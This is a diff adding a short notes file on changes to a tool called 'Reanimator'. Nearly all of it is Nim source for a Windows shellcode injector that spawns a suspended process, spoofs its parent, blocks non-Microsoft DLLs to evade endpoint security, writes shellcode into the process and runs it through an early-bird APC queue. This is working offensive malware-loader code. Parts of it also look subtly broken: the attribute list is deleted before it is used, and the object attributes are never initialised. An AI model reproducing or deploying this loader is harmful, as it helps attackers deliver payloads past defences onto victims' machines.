@@ -1,0 +1,84 @@
+Changes made to Reanimator :
+
+Injection : 
+proc inject(shellcode: ptr, sc_len: int): void =
+    #echo fmt"Start inject"
+    var
+        si: STARTUPINFOEX
+        pi: PROCESS_INFORMATION
+        ps: SECURITY_ATTRIBUTES
+        ts: SECURITY_ATTRIBUTES
+        policy: DWORD64
+        lpSize: SIZE_T
+        res: WINBOOL
+        pHandle: HANDLE
+        tHandle: HANDLE
+        ds: LPVOID
+        sc_size: SIZE_T = cast[SIZE_T](sc_len)
+
+    si.StartupInfo.cb = sizeof(si).cint
+    ps.nLength = sizeof(ps).cint
+    ts.nLength = sizeof(ts).cint
+
+    InitializeProcThreadAttributeList(NULL, 2, 0, addr lpSize)
+
+    si.lpAttributeList = cast[LPPROC_THREAD_ATTRIBUTE_LIST](HeapAlloc(GetProcessHeap(), 0, lpSize))
+
+    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, addr lpSize)
+
+    policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+    res = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, addr policy, sizeof(policy), NULL, NULL);
+
+    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT
+
+    DeleteProcThreadAttributeList(si.lpAttributeList)
+
+    var processId = os.getCurrentProcessId()
+    # echo fmt"[*] Found PPID: {processId}"
+
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var parentHandle: HANDLE
+
+    cid.UniqueProcess = processId
+
+    var status = NtOpenProcess(&parentHandle, PROCESS_ALL_ACCESS, &oa, &cid)
+
+    res = UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, addr parentHandle, sizeof(parentHandle), NULL, NULL)
+
+    res = CreateProcess(
+        NULL,
+        newWideCString(r"REPLACE_ME_PROCESS"),
+        ps,
+        ts, 
+        TRUE,
+        CREATE_SUSPENDED or DETACHED_PROCESS or CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT,
+        NULL,
+        NULL,
+        addr si.StartupInfo,
+        addr pi
+    )
+
+    # echo fmt"[*] Started process with PID: {pi.dwProcessId}"
+
+    pHandle = pi.hProcess
+    tHandle = pi.hThread
+
+    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size, MEM_COMMIT, PAGE_READWRITE);
+
+    var bytesWritten: SIZE_T
+
+    status = NtWriteVirtualMemory(pHandle, ds, shellcode, sc_size-1, addr bytesWritten);
+
+    var oldprotect: DWORD = 0;
+
+    status = NtProtectVirtualMemory(pHandle, &ds, &sc_size, PAGE_EXECUTE_READ, &oldprotect)
+
+    status = NtQueueApcThread(tHandle, cast[PKNORMAL_ROUTINE](ds), ds, NULL, NULL)
+
+    status = NtAlertResumeThread(tHandle, NULL)
+
+    sleep(5000)
+
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
